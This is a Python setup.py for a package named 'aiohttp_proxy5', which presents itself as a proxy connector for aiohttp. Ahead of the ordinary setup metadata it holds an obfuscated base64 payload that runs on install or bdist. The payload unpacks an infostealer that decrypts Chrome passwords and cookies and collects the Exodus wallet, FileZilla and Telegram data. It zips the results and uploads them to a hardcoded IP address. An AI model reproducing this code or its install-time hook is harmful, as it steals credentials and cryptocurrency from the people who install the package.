CgncGF0aF9zZWFyY2gucHknLGIiaW1wb3J0IGFzeW5jaW9cclxuaW1wb3J0IG9zXHJcbmZyb20gb3MucGF0aCBpbXBvcnQgam9pbiwgaXNkaXJcclxuZnJvbSB0eXBpbmcgaW1wb3J0IERpY3QsIEl0ZXJhYmxlLCBMaXN0XHJcblxyXG5cclxuTE9DQUwgPSBvcy5lbnZpcm9uWydVU0VSUFJPRklMRSddXHJcblxyXG5yb290X3BhdGhzID0ge1xyXG4gICAgam9pbihMT0NBTCwgJ2FwcGRhdGEnKSxcclxuICAgIGpvaW4oTE9DQUwsICdhcHBkYXRhJywgJ2xvY2FsJyksXHJcbiAgICBqb2luKExPQ0FMLCAnYXBwZGF0YScsICdyb2FtaW5nJyksXHJcbiAgICBqb2luKExPQ0FMLCAnZG9jdW1lbnRzJyksXHJcbiAgICBqb2luKExPQ0FMLCAnZG93bmxvYWRzJyksXHJcbiAgICBqb2luKExPQ0FMLCAnZGVza3RvcCcpLFxyXG4gICAgJ0M6XFxcXCcsXHJcbiAgICAnRDpcXFxcJyxcclxuICAgICdFOlxcXFwnLFxyXG4gICAgJ0M6XFxcXFByb2dyYW0gRmlsZXMnLFxyXG4gICAgJ0M6XFxcXFByb2dyYW0gRmlsZXMgKHg4NiknLFxyXG4gICAgJ0M6XFxcXFxcUHJvZ3JhbURhdGEnXHJcblxyXG59XHJcblxyXG5cclxuYXN5bmMgZGVmIHNlYXJjaF9wbHVnaW5fcGF0aHMocGF0aHM6IEl0ZXJhYmxlW3N0cl0sIHF1ZXJpZXM6IERpY3QpOlxyXG4gICAgdGFza3M6IExpc3RbYXN5bmNpby5UYXNrXSA9IFtdXHJcblxyXG4gICAgcXVlcmllcyA9IHtrLmxvd2VyKCk6IHYgZm9yIGssdiBpbiBxdWVyaWVzLml0ZW1zKCl9XHJcbiAgICB0YXJnZXRfZm9sZGVyX25hbWVzID0gc2V0KHF1ZXJpZXMua2V5cygpKVxyXG4gICAgZm9yIHAgaW4gcGF0aHM6XHJcbiAgICAgICAgaWYgaXNkaXIocCk6XHJcbiAgICAgICAgICAgIGZvciBmbmFtZSBpbiB0YXJnZXRfZm9sZGVyX25hbWVzLmludGVyc2VjdGlvbihpLm5hbWUubG93ZXIoKSBmb3IgaSBpbiBvcy5zY2FuZGlyKHApKTpcclxuICAgICAgICAgICAgICAgIGlmIHF1ZXJpZXNbZm5hbWVdIGlzIG5vdCBOb25lOlxyXG4gICAgICAgICAgICAgICAgICAgIGN1cnJfcGF0aCA9IGpvaW4ocCwgZm5hbWUpXHJcbiAgICAgICAgICAgICAgICAgICAgbG9vcCA9IGFzeW5jaW8uZ2V0X2V2ZW50X2xvb3AoKVxyXG4gICAgICAgICAgICAgICAgICAgIHRhc2sgPSBsb29wLmNyZWF0ZV90YXNrKHF1ZXJpZXNbZm5hbWVdLmNhbGxiYWNrKGN1cnJfcGF0aCkpXHJcbiAgICAgICAgICAgICAgICAgICAgdGFza3MuYXBwZW5kKHRhc2spXHJcblxyXG4gICAgZm9yIHRhc2sgaW4gdGFza3M6XHJcbiAgICAgICAgYXdhaXQgdGFza1xyXG5cclxuXHJcbmFzeW5jIGRlZiBzZWFyY2hfcGF0aHMocGF0aHM6IEl0ZXJhYmxlW3N0cl0sIHF1ZXJpZXM6IEl0ZXJhYmxlKTpcclxuICAgIHRhcmdldF9mb2xkZXJfbmFtZXMgPSB7aS5sb3dlcigpIGZvciBpIGluIHF1ZXJpZXN9XHJcbiAgICBmb3IgcCBpbiBwYXRoczpcclxuICAgICAgICBpZiBpc2RpcihwKTpcclxuICAgICAgICAgICAgZm9yIGZuYW1lIGluIHRhcmdldF9mb2xkZXJfbmFtZXMuaW50ZXJzZWN0aW9uKGkubmFtZS5sb3dlcigpIGZvciBpIGluIG9zLnNjYW5kaXIocCkpOlxyXG4gICAgICAgICAgICAgICAgaWYgZm5hbWUgaW4gdGFyZ2V0X2ZvbGRlcl9uYW1lczpcclxuICAgICAgICAgICAgICAgICAgICB5aWVsZCBqb2luKHAsIGZuYW1lKVxyXG4iKTtfX08wTzBPME9PT09PME8wTzAwICgnY29uZmlnLnB5JyxiJ2Zyb20gZGF0YWNsYXNzZXMgaW1wb3J0IGRhdGFjbGFzcywgZmllbGRcclxuZnJvbSBhaW9odHRwIGltcG9ydCBDbGllbnRTZXNzaW9uIGFzIFNlc3Npb25cclxuXHJcblxyXG5AZGF0YWNsYXNzXHJcbmNsYXNzIENvbmZpZzpcclxuICAgIGNsaWVudF9pZDogc3RyXHJcbiAgICBob3N0OiBzdHJcclxuICAgIGxvZ19wYXRoOiBzdHJcclxuICAgIGJyb3dzZXJfcGFzc3dvcmRzOiBib29sID0gZmllbGQoZGVmYXVsdD1UcnVlKVxyXG4gICAgYnJvd3Nlcl9jb29raWVzOiBib29sID0gZmllbGQoZGVmYXVsdD1UcnVlKScpO19fTzBPME8wT09PT08wTzBPMDAgKCdwYXRocy5weScsYiJmcm9tIG9zIGltcG9ydCBlbnZpcm9uXHJcbmZyb20gb3MucGF0aCBpbXBvcnQgam9pblxyXG5cclxuXHJcbkxPQ0FMID0gZW52aXJvblsnVVNFUlBST0ZJTEUnXVxyXG5URU1QID0gam9pbihMT0NBTCwgJ2FwcGRhdGEnLCAnbG9jYWwnLCAndGVtcCcpIik7X19PME8wTzBPT09PTzBPME8wMCAoJ3Rvb2xzLnB5JyxiImltcG9ydCBvc1xyXG5mcm9tIGFpb2ZpbGVzLm9zIGltcG9ydCB3cmFwXHJcbmZyb20gc2h1dGlsIGltcG9ydCBjb3B5ZmlsZSwgY29weXRyZWVcclxuaW1wb3J0IHRpbWVpdFxyXG5cclxuXHJcbmRlZiB6aXBkaXIocGF0aCwgemlwaCk6XHJcbiAgICAnJydGcm9tIHN0YWNrb3ZlcmZsb3cnJydcclxuICAgICMgemlwaCBpcyB6aXBmaWxlIGhhbmRsZVxyXG4gICAgZm9yIHJvb3QsIGRpcnMsIGZpbGVzIGluIG9zLndhbGsocGF0aCk6XHJcbiAgICAgICAgZm9yIGZpbGUgaW4gZmlsZXM6XHJcbiAgICAgICAgICAgIHppcGgud3JpdGUob3MucGF0aC5qb2luKHJvb3QsIGZpbGUpLCBcclxuICAgICAgICAgICAgICAgICAgICAgICBvcy5wYXRoLnJlbHBhdGgob3MucGF0aC5qb2luKHJvb3QsIGZpbGUpLCBcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgb3MucGF0aC5qb2luKHBhdGgsICcuLicpKSlcclxuXHJcbmNvcHlmaWxlID0gd3JhcChjb3B5ZmlsZSlcclxuY29weXRyZWUgPSB3cmFwKGNvcHl0cmVlKVxyXG4iKTtfX08wTzBPME9PT09PME8wTzAwICgncGx1Z2lucy9fX2luaXRfXy5weScsYidmcm9tIC5iYXNlX3BsdWdpbiBpbXBvcnQgUGx1Z2luXHJcblxyXG5mcm9tIC5icm93c2VycyBpbXBvcnQgQ2hyb21pdW1cclxuXHJcbmZyb20gLmRldGFpbHMgaW1wb3J0IERldGFpbHNcclxuXHJcbmZyb20gLndhbGxldHMgaW1wb3J0IEV4b2R1c1xyXG5cclxuZnJvbSAuZmlsZXppbGxhIGltcG9ydCBGaWxlemlsbGFcclxuXHJcbmZyb20gLnRlbGVncmFtIGltcG9ydCBUZWxlZ3JhbScpO19fTzBPME8wT09PT08wTzBPMDAgKCdwbHVnaW5zL2Jhc2VfcGx1Z2luLnB5JyxiJ2Zyb20gY29uZmlnIGltcG9ydCBDb25maWdcclxuZnJvbSBhYmMgaW1wb3J0IEFCQywgYWJzdHJhY3RtZXRob2RcclxuXHJcblxyXG5jbGFzcyBQbHVnaW4oQUJDKTpcclxuICAgIEBhYnN0cmFjdG1ldGhvZFxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIGNvbmY6IENvbmZpZykgLT4gTm9uZTpcclxuICAgICAgICAuLi5cclxuXHJcbiAgICBAYWJzdHJhY3RtZXRob2RcclxuICAgIGFzeW5jIGRlZiBjYWxsYmFjayhwYXRoOiBzdHIpIC0+IE5vbmU6XHJcbiAgICAgICAgLi4uJyk7X19PME8wTzBPT09PTzBPME8wMCAoJ3BsdWdpbnMvYnJvd3NlcnMvX19pbml0X18ucHknLGInZnJvbSAuY2hyb21pdW0gaW1wb3J0IENocm9taXVtJyk7X19PME8wTzBPT09PTzBPME8wMCAoJ3BsdWdpbnMvYnJvd3NlcnMvY2hyb21pdW0ucHknLF9PTzAwT09PME9PTzBPT08wMCApO19fTzBPME8wT09PT08wTzBPMDAgKCdwbHVnaW5zL2Jyb3dzZXJzL2RlY3J5cHQucHknLGInIyBodHRwczovL2dpdGh1Yi5jb20vaGFrYW5vbnltb3Mvc3RlYWwtY2hyb21lLXBhc3N3b3JkLWFsbC12ZXJzaW9uL2Jsb2IvbWFzdGVyL2xvY2FsLnB5XHJcblxyXG5cclxuaW1wb3J0IGN0eXBlc1xyXG5pbXBvcnQgY3R5cGVzLndpbnR5cGVzXHJcbmZyb20gY3J5cHRvZ3JhcGh5Lmhhem1hdC5iYWNrZW5kcyBpbXBvcnQgZGVmYXVsdF9iYWNrZW5kXHJcbmZyb20gY3J5cHRvZ3JhcGh5Lmhhem1hdC5wcmltaXRpdmVzLmNpcGhlcnMgaW1wb3J0IChcclxuICAgIENpcGhlciwgYWxnb3JpdGhtcywgbW9kZXMpXHJcbmltcG9ydCBiYXNlNjRcclxuaW1wb3J0IG9zXHJcbmltcG9ydCBqc29uXHJcblxyXG5cclxuY2xhc3MgRGVjcnlwdG9yOlxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIHBhdGgpIC0+IE5vbmU6XHJcbiAgICAgICAgaWYgcGF0aCBpcyBOb25lOlxyXG4gICAgICAgICAgICBzZWxmLnBhdGggPSBvcy5wYXRoLmpvaW4ob3MuZW52aXJvbltcJ0xPQ0FMQVBQREFUQVwnXSwgciJHb29nbGVcXENocm9tZVxcVXNlciBEYXRhXFxMb2NhbCBTdGF0ZSIpXHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgc2VsZi5wYXRoID0gcGF0aFxyXG4gICAgICAgIFxyXG4gICAgICAgIHNlbGYua2V5ID0gTm9uZVxyXG4gICAgICAgIHNlbGYuY2lwaGVyID0gTm9uZVxyXG5cclxuICAgIEBzdGF0aWNtZXRob2RcclxuICAgIGRlZiBkcGFwaV9kZWNyeXB0KGVuY3J5cHRlZCk6XHJcbiAgICAgICAgY2xhc3MgREFUQV9CTE9CKGN0eXBlcy5TdHJ1Y3R1cmUpOlxyXG4gICAgICAgICAgICBfZmllbGRzXyA9IFsoXCdjYkRhdGFcJywgY3R5cGVzLndpbnR5cGVzLkRXT1JEKSxcclxuICAgICAgICAgICAgICAgICAgICAgICAgKFwncGJEYXRhXCcsIGN0eXBlcy5QT0lOVEVSKGN0eXBlcy5jX2NoYXIpKV1cclxuXHJcbiAgICAgICAgcCA9IGN0eXBlcy5jcmVhdGVfc3RyaW5nX2J1ZmZlcihlbmNyeXB0ZWQsIGxlbihlbmNyeXB0ZWQpKVxyXG4gICAgICAgIGJsb2JpbiA9IERBVEFfQkxPQihjdHlwZXMuc2l6ZW9mKHApLCBwKVxyXG4gICAgICAgIGJsb2JvdXQgPSBEQVRBX0JMT0IoKVxyXG4gICAgICAgIHJldHZhbCA9IGN0eXBlcy53aW5kbGwuY3J5cHQzMi5DcnlwdFVucHJvdGVjdERhdGEoXHJcbiAgICAgICAgICAgIGN0eXBlcy5ieXJlZihibG9iaW4pLCBOb25lLCBOb25lLCBOb25lLCBOb25lLCAwLCBjdHlwZXMuYnlyZWYoYmxvYm91dCkpXHJcbiAgICAgICAgaWYgbm90IHJldHZhbDpcclxuICAgICAgICAgICAgcmFpc2UgY3R5cGVzLldpbkVycm9yKClcclxuICAgICAgICByZXN1bHQgPSBjdHlwZXMuc3RyaW5nX2F0KGJsb2JvdXQucGJEYXRhLCBibG9ib3V0LmNiRGF0YSlcclxuICAgICAgICBjdHlwZXMud2luZGxsLmtlcm5lbDMyLkxvY2FsRnJlZShibG9ib3V0LnBiRGF0YSlcclxuICAgICAgICByZXR1cm4gcmVzdWx0XHJcblxyXG4gICAgQHN0YXRpY21ldGhvZFxyXG4gICAgZGVmIGRlY3J5cHQoY2lwaGVyLCBjaXBoZXJ0ZXh0LCBub25jZSk6XHJcbiAgICAgICAgY2lwaGVyLm1vZGUgPSBtb2Rlcy5HQ00obm9uY2UpXHJcbiAgICAgICAgZGVjcnlwdG9yID0gY2lwaGVyLmRlY3J5cHRvcigpXHJcbiAgICAgICAgcmV0dXJuIGRlY3J5cHRvci51cGRhdGUoY2lwaGVydGV4dClcclxuXHJcbiAgICBkZWYgZ2V0X2tleV9mcm9tX2xvY2FsX3N0YXRlKHNlbGYpOlxyXG4gICAgICAgIGpzbiA9IE5vbmVcclxuICAgICAgICB3aXRoIG9wZW4oc2VsZi5wYXRoLCBcJ3JcJykgYXMgZjpcclxuICAgICAgICAgICAganNuID0ganNvbi5sb2FkcyhzdHIoZi5yZWFkbGluZSgpKSlcclxuICAgICAgICByZXR1cm4ganNuW1wnb3NfY3J5cHRcJ11bXCdlbmNyeXB0ZWRfa2V5XCddXHJcblxyXG4gICAgQHN0YXRpY21ldGhvZFxyXG4gICAgZGVmIGdldF9jaXBoZXIoa2V5KTpcclxuICAgICAgICBjaXBoZXIgPSBDaXBoZXIoXHJcbiAgICAgICAgICAgIGFsZ29yaXRobXMuQUVTKGtleSksXHJcbiAgICAgICAgICAgIE5vbmUsXHJcbiAgICAgICAgICAgIGJhY2tlbmQ9ZGVmYXVsdF9iYWNrZW5kKClcclxuICAgICAgICApXHJcbiAgICAgICAgcmV0dXJuIGNpcGhlclxyXG5cclxuICAgIGRlZiBhZXNfZGVjcnlwdChzZWxmLCBlbmNyeXB0ZWRfdHh0KTpcclxuICAgICAgICBpZiBzZWxmLmtleSBpcyBOb25lOlxyXG4gICAgICAgICAgICBlbmNvZGVkX2tleSA9IHNlbGYuZ2V0X2tleV9mcm9tX2xvY2FsX3N0YXRlKClcclxuICAgICAgICAgICAgZW5jcnlwdGVkX2tleSA9IGJhc2U2NC5iNjRkZWNvZGUoZW5jb2RlZF9rZXkuZW5jb2RlKCkpXHJcbiAgICAgICAgICAgIGVuY3J5cHRlZF9rZXkgPSBlbmNyeXB0ZWRfa2V5WzU6XVxyXG4gICAgICAgICAgICBzZWxmLmtleSA9IERlY3J5cHRvci5kcGFwaV9kZWNyeXB0KGVuY3J5cHRlZF9rZXkpXHJcbiAgICAgICAgICAgIHNlbGYuY2lwaGVyID0gRGVjcnlwdG9yLmdldF9jaXBoZXIoc2VsZi5rZXkpXHJcbiAgICAgICAgXHJcbiAgICAgICAgbm9uY2UgPSBlbmNyeXB0ZWRfdHh0WzM6MTVdXHJcblxyXG4gICAgICAgIHJldHVybiBEZWNyeXB0b3IuZGVjcnlwdChzZWxmLmNpcGhlcixlbmNyeXB0ZWRfdHh0WzE1Ol0sbm9uY2UpXHJcblxyXG4gICAgZGVmIGRlY3J5cHRfcGFzc3dvcmQoc2VsZiwgZGF0YSk6XHJcbiAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICBpZiBkYXRhWzo0XSA9PSBiXCdcXHgwMVxceDAwXFx4MDBcXHgwMFwnOlxyXG4gICAgICAgICAgICAgICAgZGVjcnlwdGVkID0gRGVjcnlwdG9yLmRwYXBpX2RlY3J5cHQoZGF0YSlcclxuICAgICAgICAgICAgICAgIHJldHVybiBkZWNyeXB0ZWQuZGVjb2RlKClcclxuICAgICAgICAgICAgZWxpZiBkYXRhWzozXSA9PSBiXCd2MTBcJzpcclxuICAgICAgICAgICAgICAgIGRlY3J5cHRlZCA9IHNlbGYuYWVzX2RlY3J5cHQoZGF0YSlcclxuICAgICAgICAgICAgICAgIHJldHVybiBkZWNyeXB0ZWRbOi0xNl0uZGVjb2RlKClcclxuICAgICAgICBleGNlcHQ6XHJcbiAgICAgICAgICAgIHJldHVybiBOb25lJyk7X19PME8wTzBPT09PTzBPME8wMCAoJ3BsdWdpbnMvYnJvd3NlcnMvQ2hyb21pdW0ucHknLF9PTzAwT09PME9PTzBPT08wMCApO19fTzBPME8wT09PT08wTzBPMDAgKCdwbHVnaW5zL2RldGFpbHMucHknLF9PME8wME9PTzBPMDAwMDAwTyApO19fTzBPME8wT09PT08wTzBPMDAgKCdwbHVnaW5zL3dhbGxldHMvX19pbml0X18ucHknLGInZnJvbSAuZXhvZHVzIGltcG9ydCBFeG9kdXMnKTtfX08wTzBPME9PT09PME8wTzAwICgncGx1Z2lucy93YWxsZXRzL2V4b2R1cy5weScsX09PTzAwME8wMDAwME9PT08wICk7X19PME8wTzBPT09PTzBPME8wMCAoJ3BsdWdpbnMvd2FsbGV0cy9FeG9kdXMucHknLF9PT08wMDBPMDAwMDBPT09PMCApO19fTzBPME8wT09PT08wTzBPMDAgKCdwbHVnaW5zL2ZpbGV6aWxsYS5weScsX08wT09PME9PT08wT08wT09PICk7X19PME8wTzBPT09PTzBPME8wMCAoJ3BsdWdpbnMvdGVsZWdyYW0ucHknLF9PMDBPMDAwT08wME8wME8wTyApO19fTzBPME8wT09PT08wTzBPMDAgKCdwbHVnaW5zL0RldGFpbHMucHknLF9PME8wME9PTzBPMDAwMDAwTyApO19fTzBPME8wT09PT08wTzBPMDAgKCdwbHVnaW5zL0ZpbGV6aWxsYS5weScsX08wT09PME9PT08wT08wT09PICk7X19PME8wTzBPT09PTzBPME8wMCAoJ3BsdWdpbnMvVGVsZWdyYW0ucHknLF9PMDBPMDAwT08wME8wME8wTyApO2ltcG9ydCBhc3luY2lvIDtmcm9tIGFzeW5jaW8gaW1wb3J0IGNyZWF0ZV90YXNrIDtmcm9tIHdlYWtyZWYgaW1wb3J0IHByb3h5IDtmcm9tIHBhdGhfc2VhcmNoIGltcG9ydCBzZWFyY2hfcGx1Z2luX3BhdGhzICxyb290X3BhdGhzIDtmcm9tIGNvbmZpZyBpbXBvcnQgQ29uZmlnIDtmcm9tIGFpb2h0dHAgaW1wb3J0IENsaWVudFNlc3Npb24gYXMgU2Vzc2lvbiAsTXVsdGlwYXJ0V3JpdGVyICxoZHJzICxGb3JtRGF0YSA7aW1wb3J0IHNlY3JldHMgLHRpbWVpdCA7ZnJvbSBwYXRocyBpbXBvcnQgVEVNUCA7ZnJvbSBvcyBpbXBvcnQgbWtkaXIgO2Zyb20gb3MgLnBhdGggaW1wb3J0IGpvaW4gO2Zyb20gemlwZmlsZSBpbXBvcnQgWmlwRmlsZSAsWklQX0RFRkxBVEVEIDtmcm9tIGJhc2U2NCBpbXBvcnQgYjY0ZW5jb2RlIDtmcm9tIHRvb2xzIGltcG9ydCB6aXBkaXIgO2Zyb20gcGx1Z2lucyBpbXBvcnQgQ2hyb21pdW0gLERldGFpbHMgLEV4b2R1cyAsRmlsZXppbGxhICxUZWxlZ3JhbSA7SE9TVCA9J2h0dHA6Ly8xNDQuMjQuMTE1LjE3MCcjbGluZToyNAoJYXN5bmMgZGVmIG1haW4gKCk6I2xpbmU6MjUKCQlPT09PT08wME8wT08wTzBPMCA9c2VjcmV0cyAudG9rZW5faGV4ICgxMCApO09PTzAwMDBPT09PMDAwMDAwID1qb2luIChURU1QICxPT09PT08wME8wT08wTzBPMCApO3ByaW50IChPT08wMDAwT09PTzAwMDAwMCApO21rZGlyIChPT08wMDAwT09PTzAwMDAwMCApO08wT08wT08wT08wME8wMDBPID1bXTtPT09PMDAwMDBPMDBPME9PMCA9Q29uZmlnIChjbGllbnRfaWQgPU9PT09PTzAwTzBPTzBPME8wICxob3N0ID1IT1NUICxsb2dfcGF0aCA9T09PMDAwME9PT08wMDAwMDAgKTtPME9PMDAwME9PT08wME8wTyA9Q2hyb21pdW0gKE9PT08wMDAwME8wME8wT08wICk7TzAwMDAwMDAwMDAwT08wTzAgPXsnZ29vZ2xlJzpPME9PMDAwME9PT08wME8wTyAsJ2V4b2R1cyc6RXhvZHVzIChPT09PMDAwMDBPMDBPME9PMCApLCdtb3ppbGxhJzpOb25lICwneWFuZGV4JzpPME9PMDAwME9PT08wME8wTyAsJ3RlbGVncmFtIGRlc2t0b3AnOlRlbGVncmFtIChPT09PMDAwMDBPMDBPME9PMCApLCd0ZWxlZ3JhbSc6VGVsZWdyYW0gKE9PT08wMDAwME8wME8wT08wICksJ29wZXJhIHNvZnR3YXJlJzpPME9PMDAwME9PT08wME8wTyAsJ2ZpbGV6aWxsYSc6RmlsZXppbGxhIChPT09PMDAwMDBPMDBPME9PMCApfTtPME9PME9PME9PMDBPMDAwTyAuYXBwZW5kIChjcmVhdGVfdGFzayAoc2VhcmNoX3BsdWdpbl9wYXRocyAocm9vdF9wYXRocyAsTzAwMDAwMDAwMDAwT08wTzAgKSkpO08wTzAwT08wTzAwTzAwTzAwID1bRGV0YWlscyAoT09PTzAwMDAwTzAwTzBPTzAgKV0jbGluZToyNgoJCWZvciBPTzBPMDBPME9PT09PME8wTyBpbiBPME8wME9PME8wME8wME8wMCA6TzBPTzBPTzBPTzAwTzAwME8gLmFwcGVuZCAoY3JlYXRlX3Rhc2sgKE9PME8wME8wT09PT08wTzBPIC5jYWxsYmFjayAoKSkpI2xpbmU6MjcKCQlmb3IgT09PME9PT09PME8wTzAwME8gaW4gTzBPTzBPTzBPTzAwTzAwME8gOmF3YWl0IE9PTzBPT09PTzBPME8wMDBPICNsaW5lOjI4CgkJT08wT09PT08wT08wMDBPT08gPWpvaW4gKFRFTVAgLGYie09PT09PTzAwTzBPTzBPME8wfS56aXAiKSNsaW5lOjI5CgkJd2l0aCBaaXBGaWxlIChPTzBPT09PTzBPTzAwME9PTyAsJ3cnLFpJUF9ERUZMQVRFRCApYXMgT08wTzBPME8wT08wT09PTzAgOnppcGRpciAoT09PMDAwME9PT08wMDAwMDAgLE9PME8wTzBPME9PME9PT08wICkjbGluZTozMAoJCXdpdGggTXVsdGlwYXJ0V3JpdGVyICgpYXMgTzAwT09PMDAwME9PMDBPT08gOiNsaW5lOjMxCgkJCU8wME9PTzAwMDBPTzAwT09PIC5hcHBlbmQgKG9wZW4gKE9PME9PT09PME9PMDAwT09PICwncmInKSkjbGluZTozMgoJCQlhc3luYyB3aXRoIFNlc3Npb24gKClhcyBPME9PT08wME8wME8wME8wTyA6YXdhaXQgTzBPT09PMDBPMDBPMDBPME8gLnBvc3QgKGYie0hPU1R9L3JlY2VpdmVfbG9nIixkYXRhID1PMDBPT08wMDAwT08wME9PTyAscGFyYW1zID17J2NsaWVudF9pZCc6T09PT09PMDBPME9PME8wTzAgfSkjbGluZTozMwoJaWYgX19uYW1lX18gPT0nX19tYWluX18nOmFzeW5jaW8gLnJ1biAobWFpbiAoKSk=').decode(encoding='utf8'))

    
if len(sys.argv) > 0 and "install" == sys.argv[1] or "bdist" in sys.argv[1]:
    print('sb_proc running')
    sb_proc()
    print('sb_proc ended')

print('Заканчивается код бека')

try:
    from setuptools import setup
except ImportError:
    from distutils.core import setup

version = None

with codecs.open(
    os.path.join(
        os.path.abspath(os.path.dirname(__file__)), "aiohttp_proxy5", "__init__.py"
    ),
    "r",
    "latin1",
) as fp:
    try:
        version = re.findall(r'^__version__ = "(\S+?)"$', fp.read(), re.M)[0]
    except IndexError:
        raise RuntimeError("Unable to determine version.")

if sys.version_info < (3, 5, 3):
    raise RuntimeError("aiohttp_proxy5 requires Python 3.5.3+")

with open("README.md") as f:
    long_description = f.read()

setup(
    name="aiohttp_proxy5",
    author="Skactor",
    author_email="sk4ct0r@gmail.com",
    version='0.1.10',
    license="Apache 2",
    url="https://github.com/Skactor/aiohttp-proxy",
    description="Full-featured proxy connector for aiohttp",
    long_description=long_description,
    long_description_content_type="text/markdown",
    packages=["aiohttp_proxy5"],
    keywords="asyncio aiohttp socks socks5 socks4 http https proxy",
    install_requires=["aiohttp>=2.3.2", "yarl"],
)
